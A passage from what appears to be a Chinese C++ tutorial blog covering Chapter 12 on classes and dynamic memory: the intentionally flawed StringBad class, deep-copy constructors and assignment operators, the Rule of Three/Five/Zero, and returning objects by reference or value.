派生类通常不需要自定义特殊成员函数，但基类必须有虚析构函数。 基类和派生类都使用 new: 派生类必须提供自己的析构函数、复制构造函数和赋值运算符。派生类的复制构造函数和赋值运算符必须显式调用基类的对应版本来处理基类部分。基类析构函数仍需是虚函数。 类设计回顾: 理解编译器生成的特殊成员函数（构造、析构、复制、移动）及其局限性。 遵循三/五/零法则来管理资源，优先使用 RAII（如智能指针、标准容器）。 合理使用 const 成员函数。 谨慎设计继承关系，确保符合 “is-a” 原则。 正确使用虚函数和虚析构函数实现多态和安全的资源管理。 继承是 C++ 中实现代码重用、建立类型层次结构和实现多态的关键机制。理解其工作原理、不同类型的继承（本章主要关注公有继承）以及相关的设计原则对于编写强大的、可维护的面向对象程序至关重要。","categories":[],"tags":[{"name":"Program","slug":"Program","permalink":"http://uniqueland.top/tags/Program/"},{"name":"C++","slug":"C","permalink":"http://uniqueland.top/tags/C/"}]},{"title":"Chapter 12 类和动态内存分配","slug":"Cpp_tutorial_Chapter_12","date":"2025-04-30T15:42:24.005Z","updated":"2025-04-30T15:39:55.641Z","comments":true,"path":"2025/04/30/Cpp_tutorial_Chapter_12/","link":"","permalink":"http://uniqueland.top/2025/04/30/Cpp_tutorial_Chapter_12/","excerpt":"","text":"12.1 动态内存和类当类需要使用 new 在自由存储区（堆）上分配内存时，情况会变得比之前我们看到的类（如 Stock, Time, Vector）更复杂。这些类的数据成员本身（如 int, double, std::string）要么大小固定，要么像 std::string 那样自己管理内存。 但是，如果你的类直接使用指针来管理通过 new 分配的内存（例如，自定义一个字符串类来管理 char* 指针指向的内存），那么 C++ 编译器自动生成的某些默认行为（特别是对象复制和赋值）可能会导致严重的问题，如内存泄漏和程序崩溃。本章将探讨这些问题以及如何通过定义特殊的成员函数来解决它们。 12.1.1 复习示例和静态类成员让我们从一个简单的、故意设计得有问题的字符串类 StringBad 开始，它使用 char* 指针来指向动态分配的内存。 StringBad 类定义 (stringbad.h) 12345678910111213141516171819202122#ifndef STRINGBAD_H_#define STRINGBAD_H_#include &lt;iostream&gt;class StringBad &#123;private: char * str; // 指向字符串的指针 int len; // 字符串长度 // 静态数据成员: 用于跟踪对象数量 static int num_strings;public: // 构造函数 StringBad(const char * s); // 从 C 字符串构造 StringBad(); // 默认构造函数 // 析构函数 ~StringBad(); // 非常重要！ // 友元函数: 重载 &lt;&lt; friend std::ostream &amp; operator&lt;&lt;(std::ostream &amp; os, const StringBad &amp; st);&#125;;#endif // STRINGBAD_H_ StringBad 类实现 (stringbad.cpp) 1234567891011121314151617181920212223242526272829303132333435363738#include &lt;cstring&gt; // 为了使用 strlen, strcpy#include &quot;stringbad.h&quot;// 初始化静态类成员 num_strings// 注意：静态数据成员必须在类定义外部进行定义和初始化int StringBad::num_strings = 0; // 初始化为 0// 构造函数: 从 C 字符串构造StringBad::StringBad(const char * s) &#123; len = std::strlen(s); // 获取长度 str = new char[len + 1]; // 分配内存 (+1 为了存储末尾的 &#x27;\\0&#x27;) std::strcpy(str, s); // 复制字符串到新内存 num_strings++; // 对象计数增加 std::cout &lt;&lt; num_strings &lt;&lt; &quot;: \\&quot;&quot; &lt;&lt; str &lt;&lt; &quot;\\&quot; object created\\n&quot;; // 调试信息&#125;// 默认构造函数StringBad::StringBad() &#123; len = 4; str = new char[4]; std::strcpy(str, &quot;C++&quot;); // 默认值 num_strings++; std::cout &lt;&lt; num_strings &lt;&lt; &quot;: \\&quot;&quot; &lt;&lt; str &lt;&lt; &quot;\\&quot; default object created\\n&quot;; // 调试信息&#125;// 析构函数StringBad::~StringBad() &#123; std::cout &lt;&lt; &quot;\\&quot;&quot; &lt;&lt; str &lt;&lt; &quot;\\&quot; object deleted, &quot;; // 调试信息 --num_strings; // 对象计数减少 std::cout &lt;&lt; num_strings &lt;&lt; &quot; left\\n&quot;; // 调试信息 delete [] str; // 释放内存！&#125;// 友元函数: 重载 &lt;&lt;std::ostream &amp; operator&lt;&lt;(std::ostream &amp; os, const StringBad &amp; st) &#123; os &lt;&lt; st.str; return os;&#125; 这个类看起来似乎能工作：它在构造时分配内存，在析构时释放内存。但是，它缺少一些关键的东西，我们稍后会看到。 静态类成员 (Static Class Members) 在 StringBad 中，我们引入了一个 static int num_strings;。这是一个静态数据成员。 共享性: 静态数据成员不属于任何单个对象，而是被类的所有对象共享。无论创建多少个 StringBad 对象，num_strings 只有一个副本。 生命周期: 静态数据成员在程序启动时创建，在程序结束时销毁，其生命周期与程序的运行时间相同，即使没有创建任何类对象，它也存在。 初始化: 静态数据成员必须在类定义之外进行初始化（通常在对应的 .cpp 文件中），如 int StringBad::num_strings = 0;。初始化时需要使用类名和作用域解析运算符 ::，并且不再需要 static 关键字。 例外：const 的整型或枚举类型的静态成员（以及 C++11 中的 constexpr 静态成员）可以在类定义内部初始化。 用途: 常用于跟踪类的实例数量、共享类范围内的常量或标志等。 除了静态数据成员，还有**静态成员函数 (Static Member Functions)**。 声明: 在函数声明前加上 static 关键字。 无 this 指针: 静态成员函数不与任何特定对象关联，因此它们没有 this 指针。 访问限制: 它们只能直接访问类的静态数据成员或其他静态成员函数。它们不能直接访问非静态成员（数据或函数），因为非静态成员需要通过对象（this 指针）来访问。 调用: 可以通过类名和作用域解析运算符调用（ClassName::static_func()），也可以通过类的对象调用（object.static_func()），但推荐使用前者，因为它更清晰地表明了函数的静态属性。 123456789101112131415161718192021222324252627282930// 示例：添加一个静态成员函数到 StringBad// stringbad.hclass StringBad &#123; // ... existing private members ... static int num_strings;public: // ... existing public members ... // 静态成员函数 static int HowMany();&#125;;// stringbad.cpp// ... existing code ...// 定义静态成员函数int StringBad::HowMany() &#123; return num_strings; // 可以访问静态成员 num_strings // return len; // 错误！不能直接访问非静态成员 len&#125;// main.cpp#include &quot;stringbad.h&quot;#include &lt;iostream&gt;int main() &#123; StringBad s1(&quot;Hello&quot;); StringBad s2(&quot;World&quot;); std::cout &lt;&lt; &quot;Number of objects: &quot; &lt;&lt; StringBad::HowMany() &lt;&lt; std::endl; // 通过类名调用 std::cout &lt;&lt; &quot;Number of objects: &quot; &lt;&lt; s1.HowMany() &lt;&lt; std::endl; // 通过对象调用 (不推荐) return 0;&#125; 12.1.2 特殊成员函数C++ 类有一些特殊的成员函数，如果程序员没有显式定义它们，编译器可能会自动生成默认版本。这些函数对于控制对象的创建、销毁、复制和移动至关重要： 默认构造函数 (Default Constructor): 如果你没有定义任何构造函数，编译器会生成一个。它通常什么也不做（对于内置类型成员）或调用成员对象的默认构造函数。 析构函数 (Destructor): 如果你没有定义析构函数，编译器会生成一个。它通常什么也不做或调用成员对象的析构函数。对于需要释放资源的类（如 StringBad），必须定义自己的析构函数。 复制构造函数 (Copy Constructor): 如果你没有定义，编译器会生成一个。它的参数通常是同类对象的 const 引用（例如 StringBad(const StringBad&amp;)）。默认的复制构造函数执行成员逐一复制 (memberwise copy) 或称**浅复制 (shallow copy)**。 复制赋值运算符 (Copy Assignment Operator): 如果你没有定义，编译器会生成一个。它的参数通常是同类对象的 const 引用，并返回一个指向调用对象的引用（例如 StringBad&amp; operator=(const StringBad&amp;)）。默认的赋值运算符也执行**成员逐一复制 (浅复制)**。 移动构造函数 (Move Constructor) (C++11): 如果你没有定义任何复制/移动操作或析构函数，编译器可能会生成一个。参数是同类对象的右值引用（StringBad(StringBad&amp;&amp;)）。默认执行成员逐一移动。 移动赋值运算符 (Move Assignment Operator) (C++11): 如果你没有定义任何复制/移动操作或析构函数，编译器可能会生成一个。参数是同类对象的右值引用，返回对象引用（StringBad&amp; operator=(StringBad&amp;&amp;)）。默认执行成员逐一移动。 关键问题：成员逐一复制 (浅复制) 对于像 int 或 double 这样的简单数据成员，成员逐一复制工作得很好。但是，对于指针成员（如 StringBad 中的 char * str），成员逐一复制仅仅是复制指针的值（地址），而不是指针所指向的数据。这就是所谓的浅复制。 12.1.3 回到 StringBad：复制构造函数的哪里出了问题考虑以下代码，它会隐式地调用复制构造函数： 12345678910111213141516171819202122232425262728293031323334353637383940// main_problem.cpp#include &lt;iostream&gt;#include &quot;stringbad.h&quot; // 假设 stringbad.h/cpp 如上定义 (没有自定义复制构造函数)void callme1(StringBad sb) &#123; // 按值传递，调用复制构造函数 std::cout &lt;&lt; &quot;String passed by value:\\n&quot;; std::cout &lt;&lt; &quot; \\&quot;&quot; &lt;&lt; sb &lt;&lt; &quot;\\&quot;\\n&quot;;&#125;int main() &#123; using std::cout; using std::endl; &#123; cout &lt;&lt; &quot;Starting an inner block.\\n&quot;; StringBad headline1(&quot;Celery Stalks at Midnight&quot;); StringBad headline2(&quot;Lettuce Prey&quot;); StringBad sports(&quot;Spinach Leaves Bowl for Dollars&quot;); cout &lt;&lt; &quot;headline1: &quot; &lt;&lt; headline1 &lt;&lt; endl; cout &lt;&lt; &quot;headline2: &quot; &lt;&lt; headline2 &lt;&lt; endl; cout &lt;&lt; &quot;sports: &quot; &lt;&lt; sports &lt;&lt; endl; callme1(headline1); // 调用 callme1，headline1 被复制到参数 sb cout &lt;&lt; &quot;headline1: &quot; &lt;&lt; headline1 &lt;&lt; endl; // 再次打印 headline1 cout &lt;&lt; &quot;Initialize one object to another:\\n&quot;; StringBad sailor = sports; // 调用复制构造函数 cout &lt;&lt; &quot;sailor: &quot; &lt;&lt; sailor &lt;&lt; endl; cout &lt;&lt; &quot;Assign one object to another:\\n&quot;; StringBad knot; // 调用默认构造函数 knot = headline1; // 调用赋值运算符 (这里是默认的) cout &lt;&lt; &quot;knot: &quot; &lt;&lt; knot &lt;&lt; endl; cout &lt;&lt; &quot;Exiting the inner block.\\n&quot;; &#125; // 作用域结束，headline1, headline2, sports, sailor, knot 的析构函数被调用 cout &lt;&lt; &quot;End of main()\\n&quot;; return 0;&#125; 当你运行这段代码时（假设编译器生成了默认的复制构造函数和赋值运算符），你会遇到严重的问题，很可能程序会崩溃。原因如下： callme1(headline1): 当 headline1 按值传递给 callme1 时，会调用复制构造函数来创建参数 sb。默认的复制构造函数执行浅复制：sb.str 被设置为与 headline1.str 相同的内存地址。 callme1 结束: 当 callme1 函数返回时，其局部变量 sb 被销毁，调用 sb 的析构函数 ~StringBad()。这个析构函数执行 delete [] sb.str;，释放了 headline1.str 指向的内存！ headline1 的后续使用: 回到 main 函数后，headline1.str 现在是一个悬挂指针 (dangling pointer)**，它指向已经被释放的内存。任何试图访问 headline1 内容的操作（如 cout &lt;&lt; headline1 或 knot = headline1）都将导致未定义行为**（通常是崩溃）。 StringBad sailor = sports;: 同样，默认复制构造函数使 sailor.str 和 sports.str 指向同一块内存。 作用域结束: 当 main 函数的内部作用域 &#123;&#125; 结束时，所有局部对象（headline1, headline2, sports, sailor, knot）的析构函数被调用。 ~StringBad() for knot 可能尝试删除已经被 callme1 中 sb 的析构函数删除的内存（如果 knot = headline1 发生在 callme1 之后）。 ~StringBad() for sailor 会删除 sports.str 指向的内存。 ~StringBad() for sports 会再次尝试删除同一块内存。 ~StringBad() for headline2 正常工作。 ~StringBad() for headline1 尝试删除已经被 callme1 中 sb 的析构函数删除的内存。 这种重复删除 (double deletion) 同一块内存的行为是导致程序崩溃的常见原因。 12.1.4 StringBad 的其他问题：赋值运算符默认的赋值运算符 operator= 同样执行浅复制，也会导致问题： 1234StringBad knot; // knot.str 指向 &quot;C++&quot; 的内存StringBad headline1(&quot;Celery Stalks at Midnight&quot;); // headline1.str 指向 &quot;Celery...&quot; 的内存knot = headline1; // 调用默认赋值运算符 执行 knot = headline1; 后： knot.len 被设置为 headline1.len。 knot.str 被设置为 headline1.str 的值（内存地址）。 结果： knot.str 和 headline1.str 指向同一块内存 (“Celery…”)。 knot 原来指向的内存 (“C++”) 的地址丢失了，这块内存没有被 delete，造成了**内存泄漏 (memory leak)**。 当 knot 和 headline1 的析构函数被调用时，会发生重复删除。 结论: 对于管理动态内存的类（即类内部有指针成员，并且类负责 new 和 delete 这些指针指向的内存），编译器生成的默认复制构造函数和默认赋值运算符是不安全的，会导致浅复制、内存泄漏和重复删除等问题。 为了解决这些问题，我们需要为这样的类提供我们自己的、正确实现的： 析构函数: 确保释放所有通过 new 分配的资源。 复制构造函数: 执行**深复制 (deep copy)**，即为新对象分配自己的内存，并将原始对象的数据复制到新内存中。 复制赋值运算符: 执行深复制，并正确处理自我赋值（obj = obj;）和释放旧资源。 这通常被称为复制控制 (Copy Control) 或遵循**三/五/零法则 (Rule of Three/Five/Zero)**。如果一个类需要自定义析构函数、复制构造函数或复制赋值运算符中的任何一个，那么它很可能需要自定义所有这三个（C++11 前的三法则）。在 C++11 中，如果需要自定义这三个中的任何一个或移动构造函数/移动赋值运算符，则可能需要考虑所有五个（五法则）。或者，通过使用 RAII（资源获取即初始化）原则和智能指针等现代 C++ 技术，可能可以避免手动管理内存，从而不需要自定义这些特殊成员函数（零法则）。 12.2 改进后的新 String 类上一节我们看到了 StringBad 类的问题：由于它管理动态内存，编译器自动生成的默认复制构造函数和赋值运算符执行的浅复制（只复制指针地址）导致了内存泄漏和重复删除等严重错误。 为了解决这些问题，我们需要遵循复制控制原则（或称三/五法则），为管理动态内存的类提供自定义的特殊成员函数。本节我们创建一个改进的 String 类（放在 string1.h 和 string1.cpp 中），它能正确处理动态内存。 核心改进：深复制 (Deep Copy) 关键在于实现深复制，而不是浅复制。深复制意味着当复制对象时，不仅复制普通成员的值，还要为指针成员指向的数据分配新的内存，并将原始数据复制到这块新内存中。 1. 复制构造函数 (Copy Constructor) 当一个对象需要通过同类型的另一个对象来初始化时（例如 String s2 = s1; 或按值传递参数），复制构造函数会被调用。我们的自定义版本必须执行深复制： 123456789// string1.cpp excerpt// Copy Constructor (Deep Copy)String::String(const String &amp; st) &#123; num_strings++; // 更新静态计数器 len = st.len; // 复制长度 str = new char [len + 1]; // *** 为新对象分配自己的内存 *** std::strcpy(str, st.str); // *** 将数据复制到新内存中 *** // std::cout &lt;&lt; &quot;COPY constructor called for &quot; &lt;&lt; str &lt;&lt; &quot;\\n&quot;; // 调试信息&#125; 现在，当 String s2 = s1; 执行时，s2 会拥有自己独立的一块内存，其中包含与 s1 相同内容的字符串副本。s1 和 s2 的 str 指针将指向不同的内存地址。 2. 赋值运算符 (Assignment Operator) 当将一个已存在的对象赋值给另一个已存在的对象时（例如 s2 = s1;），赋值运算符会被调用。它需要做更多工作： 12345678910111213141516171819// string1.cpp excerpt// Assignment Operator (Deep Copy)String &amp; String::operator=(const String &amp; st) &#123; // std::cout &lt;&lt; &quot;Assignment operator called for &quot; &lt;&lt; str &lt;&lt; &quot;\\n&quot;; // 调试信息 // 1. 自我赋值检查: 防止 obj = obj; 导致意外删除 if (this == &amp;st) return *this; // 返回当前对象 // 2. 释放旧内存: 释放当前对象 (*this) 原来占用的内存 delete [] str; // 3. 深复制: 与复制构造函数类似 len = st.len; str = new char [len + 1]; // 分配新内存 std::strcpy(str, st.str); // 复制数据 // 4. 返回引用: 返回对调用对象 (*this) 的引用，以支持链式赋值 (a = b = c) return *this;&#125; 这个实现确保了： 自我赋值安全: 如果尝试 s1 = s1;，操作会直接返回，不会错误地释放内存。 内存管理: 在复制新数据之前，正确释放了对象原来占用的内存，防止内存泄漏。 深复制: 为对象分配了新的内存并复制了数据。 12.2.1 修订后的默认构造函数默认构造函数现在创建一个空字符串，而不是像 StringBad 那样创建一个 “C++” 字符串。这通常更有用。 1234567// string1.cpp excerptString::String() &#123; // default constructor len = 0; str = new char[1]; // 分配足够存储空字符 &#x27;\\0&#x27; 的空间 str[0] = &#x27;\\0&#x27;; // 设置为空字符串 num_strings++;&#125; 12.2.2 比较成员函数为了能够比较 String 对象，我们重载了关系运算符 ==, &lt;, &gt;。这些通常实现为友元函数，因为我们希望能够比较 string1 == string2，并且它们需要访问私有成员 str。我们利用 C 库函数 strcmp() 来进行比较。 123456789101112// string1.cpp excerpt (友元函数定义)bool operator&lt;(const String &amp;st1, const String &amp;st2) &#123; return (std::strcmp(st1.str, st2.str) &lt; 0);&#125;bool operator&gt;(const String &amp;st1, const String &amp;st2) &#123; return st2 &lt; st1; // 利用已定义的 operator&lt;&#125;bool operator==(const String &amp;st1, const String &amp;st2) &#123; return (std::strcmp(st1.str, st2.str) == 0);&#125; 12.2.3 使用中括号表示法访问字符为了像访问普通 C 字符串数组一样访问 String 对象中的单个字符（例如 myString[0]），我们重载了下标运算符 []。通常需要提供两个版本： 非 const 版本: char &amp; operator[](int i); 返回一个 char 的引用，允许修改字符（例如 myString[0] = &#39;H&#39;;）。 const 版本: const char &amp; operator[](int i) const; 用于 const String 对象，返回一个 const char 的引用，只允许读取字符（例如 const String greeting = &quot;Hi&quot;; char c = greeting[0];）。 123456789101112// string1.cpp excerpt// read-write char access for non-const Stringchar &amp; String::operator[](int i) &#123; // 注意：为了简化，这里没有添加边界检查 return str[i];&#125;// read-only char access for const Stringconst char &amp; String::operator[](int i) const &#123; // 注意：为了简化，这里没有添加边界检查 return str[i];&#125; 实际应用中通常需要添加边界检查（检查 i 是否在 0 到 len-1 的有效范围内）。 12.2.4 静态类成员函数我们保留了静态成员 num_strings 和静态成员函数 HowMany() 来跟踪已创建的 String 对象数量。 123456789101112131415// string1.h excerptclass String &#123; // ... static int num_strings;public: // ... static int HowMany();&#125;;// string1.cpp excerptint String::num_strings = 0; // 初始化int String::HowMany() &#123; return num_strings;&#125; 12.2.5 进一步重载赋值运算符除了从另一个 String 对象赋值，我们通常还希望能够直接从 C 风格字符串 (const char*) 赋值，例如 myString = &quot;Hello&quot;;。为此，我们重载了另一个版本的赋值运算符。 123456789101112131415161718// string1.h excerptclass String &#123; // ...public: // ... String &amp; operator=(const String &amp;); // String = String String &amp; operator=(const char *); // String = &quot;C-string&quot; // ...&#125;;// string1.cpp excerptString &amp; String::operator=(const char * s) &#123; delete [] str; // 释放旧内存 len = std::strlen(s); str = new char[len + 1]; std::strcpy(str, s); return *this; // 返回引用&#125; 使用改进后的 String 类 现在，使用这个改进后的 String 类（定义在 string1.h 和 string1.cpp 中），之前导致问题的代码可以安全运行了。下面的示例程序 (sayings1.cpp) 展示了如何使用这个类： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061// sayings1.cpp -- 使用改进的 String 类#include &lt;iostream&gt;#include &quot;string1.h&quot; // 使用 string1.hconst int ArSize = 10;const int MaxLen = 81;int main() &#123; using std::cout; using std::cin; using std::endl; String name; // 调用默认构造函数 cout &lt;&lt; &quot;Hi, what&#x27;s your name?\\n&gt;&gt; &quot;; cin &gt;&gt; name; // 调用 operator&gt;&gt; cout &lt;&lt; name &lt;&lt; &quot;, please enter up to &quot; &lt;&lt; ArSize &lt;&lt; &quot; short sayings &lt;empty line to quit&gt;:\\n&quot;; String sayings[ArSize]; // 调用 ArSize 次默认构造函数 char temp[MaxLen]; int i; for (i = 0; i &lt; ArSize; i++) &#123; cout &lt;&lt; i + 1 &lt;&lt; &quot;: &quot;; cin.get(temp, MaxLen); // 读取一行 while (cin &amp;&amp; cin.get() != &#x27;\\n&#x27;) // 清除行尾换行符 continue; if (!cin || temp[0] == &#x27;\\0&#x27;) // 检查空行或输入错误 break; // i 未增加 else sayings[i] = temp; // 调用 operator=(const char*) &#125; int total = i; // 记录实际输入的数量 if (total &gt; 0) &#123; cout &lt;&lt; &quot;Here are your sayings:\\n&quot;; for (i = 0; i &lt; total; i++) cout &lt;&lt; sayings[i][0] &lt;&lt; &quot;: &quot; &lt;&lt; sayings[i] &lt;&lt; endl; // 使用 operator[] 和 operator&lt;&lt; // 找到最短和第一个字母顺序最小的字符串 int shortest = 0; int first = 0; for (i = 1; i &lt; total; i++) &#123; if (sayings[i].length() &lt; sayings[shortest].length()) // 使用 length() shortest = i; if (sayings[i] &lt; sayings[first]) // 使用 operator&lt; first = i; &#125; cout &lt;&lt; &quot;Shortest saying:\\n&quot; &lt;&lt; sayings[shortest] &lt;&lt; endl; cout &lt;&lt; &quot;First alphabetically:\\n&quot; &lt;&lt; sayings[first] &lt;&lt; endl; // 使用复制构造函数 String favorite = sayings[shortest]; cout &lt;&lt; &quot;My favorite saying:\\n&quot; &lt;&lt; favorite &lt;&lt; endl; cout &lt;&lt; &quot;This program used &quot; &lt;&lt; String::HowMany() &lt;&lt; &quot; String objects. Bye.\\n&quot;; // 使用 HowMany() &#125; else &#123; cout &lt;&lt; &quot;No input! Bye.\\n&quot;; &#125; return 0;&#125; 这个程序现在可以正确地创建、复制、赋值和销毁 String 对象，而不会出现内存泄漏或崩溃，因为我们提供了正确的析构函数、复制构造函数和赋值运算符来处理动态内存。 12.3 在构造函数中使用 new 时应注意的事项当类的构造函数使用 new 来分配动态内存时，需要特别注意内存管理和潜在的错误情况，以确保程序的健壮性和避免资源泄漏。 12.3.1 应该和不应该应该做的事: 在析构函数中使用 delete: 如果构造函数使用 new 分配了内存，那么必须在析构函数中使用 delete（或 delete[] 如果分配的是数组）来释放这些内存。这是防止内存泄漏的基本要求。 1234567891011121314151617class MyClass &#123;private: int * data; size_t size;public: MyClass(size_t n) : size(n) &#123; data = new int[size]; // 分配内存 // ... 初始化 data ... std::cout &lt;&lt; &quot;MyClass constructed, allocated memory.\\n&quot;; &#125; ~MyClass() &#123; delete [] data; // *** 必须在析构函数中释放内存 *** std::cout &lt;&lt; &quot;MyClass destructed, freed memory.\\n&quot;; &#125; // *** 还需要复制构造函数和赋值运算符 (Rule of Three/Five) *** // ...&#125;; 使用 delete[] 释放数组: 如果构造函数使用 new T[size] 分配了数组，析构函数必须使用 delete[] 来释放。如果使用 new T 分配单个对象，则使用 delete。混用会导致未定义行为。 实现深复制: 如果类管理动态内存，必须提供自定义的复制构造函数和复制赋值运算符来执行深复制，以避免浅复制带来的问题（如重复删除、悬挂指针）。 不应该做的事 (或需要注意): 忘记 delete: 不在析构函数中释放构造函数分配的内存会导致内存泄漏。每次对象销毁时，它占用的动态内存都不会被回收。 构造函数中 new 失败: new 运算符在无法分配所需内存时，默认会抛出 std::bad_alloc 异常。 如果 new 抛出异常，对象的构造过程会立即终止。 重要的是，对象的析构函数不会被调用，因为对象从未被完全构造。 这意味着，如果在抛出异常的 new 之前，构造函数已经成功分配了其他动态资源（例如，通过另一个 new），那么这些资源可能会泄漏，因为没有析构函数来清理它们。 1234567891011121314151617181920212223242526272829303132333435363738class Problematic &#123;private: int * data1; char * data2;public: Problematic(size_t n1, size_t n2) : data1(nullptr), data2(nullptr) &#123; // 初始化为 nullptr try &#123; data1 = new int[n1]; std::cout &lt;&lt; &quot;Allocated data1\\n&quot;; // *** 如果下面的 new 失败 *** data2 = new char[n2]; std::cout &lt;&lt; &quot;Allocated data2\\n&quot;; &#125; catch (const std::bad_alloc &amp; ba) &#123; std::cerr &lt;&lt; &quot;Memory allocation failed: &quot; &lt;&lt; ba.what() &lt;&lt; std::endl; // *** 析构函数不会调用，需要在这里手动清理 data1 (如果已分配) *** delete [] data1; // 如果 data1 分配成功但 data2 失败，需要释放 data1 data1 = nullptr; // 避免悬挂指针 (虽然对象构造失败了) // 重新抛出异常或处理错误 throw; // 重新抛出，让调用者知道构造失败 &#125; &#125; ~Problematic() &#123; std::cout &lt;&lt; &quot;Problematic destructor called\\n&quot;; delete [] data1; delete [] data2; &#125; // ... 复制控制 ...&#125;;int main() &#123; try &#123; // 尝试分配非常大的内存，可能会失败 Problematic p(100, 1000000000000ULL); &#125; catch (...) &#123; std::cerr &lt;&lt; &quot;Failed to create Problematic object.\\n&quot;; &#125; return 0;&#125; 更好的方法: 使用 RAII（资源获取即初始化）原则，例如使用智能指针（如 std::unique_ptr）来管理动态内存。智能指针会在其自身被销毁时自动释放所管理的内存，即使发生异常导致栈展开，也能保证资源被释放。 1234567891011121314151617181920212223242526#include &lt;memory&gt; // for std::unique_ptrclass BetterClass &#123;private: std::unique_ptr&lt;int[]&gt; data1; // 使用智能指针管理数组 std::unique_ptr&lt;char[]&gt; data2;public: BetterClass(size_t n1, size_t n2) : data1(new int[n1]), data2(new char[n2]) // 直接在初始化列表中分配 &#123; std::cout &lt;&lt; &quot;BetterClass constructed.\\n&quot;; // 如果 new 失败，异常会抛出，已成功构造的 unique_ptr (如果有) 会自动释放内存 // 不需要 try-catch 来手动 delete &#125; // 不需要显式析构函数来 delete data1/data2，unique_ptr 会自动处理 // 但仍然需要遵循 Rule of Three/Five/Zero (使用 unique_ptr 通常遵循 Rule of Zero) ~BetterClass() &#123; std::cout &lt;&lt; &quot;BetterClass destructed.\\n&quot;; &#125; // 可能需要自定义复制/移动操作，或者禁用它们，因为 unique_ptr 默认不可复制 BetterClass(const BetterClass&amp;) = delete; BetterClass&amp; operator=(const BetterClass&amp;) = delete; // 可以添加移动操作 BetterClass(BetterClass&amp;&amp;) = default; BetterClass&amp; operator=(BetterClass&amp;&amp;) = default;&#125;; 12.3.2 包含类成员的类的逐成员复制当一个类（称为包含类或容器类）包含其他类的对象作为其成员时，默认的复制构造函数和赋值运算符的行为仍然是成员逐一复制。 这意味着对于容器类中的每个成员： 如果是内置类型（int, double, 指针等），则按值复制。 如果是类对象，则调用该成员对象的复制构造函数（对于容器的复制构造）或赋值运算符（对于容器的赋值运算）。 示例: 假设我们有一个 Gadget 类，它包含一个我们之前改进过的 String 对象（来自 string1.h）。 12345678910111213141516171819202122232425262728293031323334353637383940// gadget.h#ifndef GADGET_H_#define GADGET_H_#include &quot;string1.h&quot; // 包含改进的 String 类class Gadget &#123;private: String name; // 成员是 String 对象 int id;public: Gadget(const char * s = &quot;Default Gadget&quot;, int i = 0) : name(s), id(i) &#123;&#125; Gadget(const String&amp; s, int i = 0) : name(s), id(i) &#123;&#125; // *** 没有显式定义复制构造函数和赋值运算符 *** void show() const &#123; std::cout &lt;&lt; &quot;ID: &quot; &lt;&lt; id &lt;&lt; &quot;, Name: &quot; &lt;&lt; name &lt;&lt; std::endl; &#125;&#125;;#endif // GADGET_H_// main.cpp#include &lt;iostream&gt;#include &quot;gadget.h&quot;int main() &#123; Gadget g1(&quot;Flux Capacitor&quot;, 121); g1.show(); std::cout &lt;&lt; &quot;\\n--- Copying g1 to g2 ---\\n&quot;; Gadget g2 = g1; // 调用 Gadget 的默认复制构造函数 g2.show(); std::cout &lt;&lt; &quot;\\n--- Assigning g1 to g3 ---\\n&quot;; Gadget g3; // 调用 Gadget 默认构造函数 (name 会调用 String 默认构造函数) g3.show(); g3 = g1; // 调用 Gadget 的默认赋值运算符 g3.show(); std::cout &lt;&lt; &quot;\\n--- End of main ---\\n&quot;; return 0; // g1, g2, g3 的析构函数被调用&#125; 发生了什么？ Gadget g2 = g1; (默认复制构造函数): 编译器生成的 Gadget 复制构造函数会执行成员逐一复制。 对于 int id 成员：g2.id 被设置为 g1.id 的值 (121)。 对于 String name 成员：调用 String 类的复制构造函数 String(const String&amp;) 来初始化 g2.name，使用 g1.name 作为源。因为我们的 String 类有正确的深复制构造函数，所以 g2.name 会获得 g1.name 内容的独立副本。 g3 = g1; (默认赋值运算符): 编译器生成的 Gadget 赋值运算符会执行成员逐一赋值。 对于 int id 成员：g3.id 被设置为 g1.id 的值。 对于 String name 成员：调用 String 类的赋值运算符 operator=(const String&amp;)，将 g1.name 赋给 g3.name (g3.name = g1.name;)。因为 String 类有正确的深复制赋值运算符（它会先释放 g3.name 的旧内存，然后分配新内存并复制内容），所以赋值操作是安全的。 结论: 如果一个类包含其他类的对象作为成员，并且这些成员对象所属的类已经正确地实现了它们自己的复制控制（即它们能安全地进行深复制和内存管理，像我们的 String 类或标准库类 std::string, std::vector 等），那么对于这些成员来说，包含类的默认成员逐一复制行为通常是足够且安全的。 但是，如果包含类本身还直接管理其他动态内存（例如，Gadget 类除了 String name 之外，还有一个 int* extra_data 指针，并且 Gadget 负责 new/delete 这个指针），那么这个包含类仍然需要提供自己的自定义复制构造函数和赋值运算符来处理 extra_data 的深复制，即使 String name 成员的复制可以由 String 类自己处理。 这就是零法则 (Rule of Zero) 发挥作用的地方：如果你的类只使用那些自身能正确管理资源的成员（如 std::string, std::vector, std::unique_ptr 等），并且不直接进行手动的 new/delete，那么你通常不需要提供任何自定义的析构函数、复制/移动构造函数或赋值运算符，编译器生成的默认版本就能很好地工作。 12.4 有关返回对象的说明当函数或方法需要返回一个类对象时，有几种不同的方式可以实现，每种方式都有其适用的场景和潜在的效率或安全 implications。主要的方式包括：返回指向对象的引用（const 或非 const）和返回对象本身（按值返回，const 或非 const）。 12.4.1 返回指向 const 对象的引用语法: const ClassName &amp; functionName(parameters); 何时使用:当函数需要返回一个已经存在的对象（例如，类的成员、通过引用传递给函数的对象），并且不希望调用者通过返回的引用修改这个对象时。 优点: 高效: 避免了创建对象的副本。返回的只是对象的地址（引用）。 安全: const 保证了调用者不能意外地修改返回的对象。 缺点/注意事项: 不能返回局部对象的引用: 函数不能返回在函数内部创建的局部变量的引用。当函数结束时，局部变量会被销毁，返回的引用将成为**悬挂引用 (dangling reference)**，访问它会导致未定义行为。 返回的对象必须在函数调用结束后仍然存在。 示例:假设我们有一个 Store 类，包含多个 Product 对象，我们想提供一个方法来通过 ID 获取某个产品的信息，但不允许修改它。 12345678910111213141516171819202122232425262728293031323334353637class Product &#123;private: std::string name; double price;public: Product(const std::string&amp; n = &quot;N/A&quot;, double p = 0.0) : name(n), price(p) &#123;&#125; void show() const &#123; std::cout &lt;&lt; name &lt;&lt; &quot;: $&quot; &lt;&lt; price; &#125; // ... 其他方法 ...&#125;;class Store &#123;private: std::vector&lt;Product&gt; products; Product defaultProduct; // 用于找不到时返回public: // ... 方法添加产品 ... // 通过 ID 查找产品，返回 const 引用 const Product &amp; findProductById(int id) const &#123; if (id &gt;= 0 &amp;&amp; id &lt; products.size()) &#123; return products[id]; // 返回 vector 中已存在对象的 const 引用 &#125; else &#123; return defaultProduct; // 返回一个已存在的默认对象的 const 引用 &#125; // 错误示例： // Product temp(&quot;Temporary&quot;, 0.0); // return temp; // 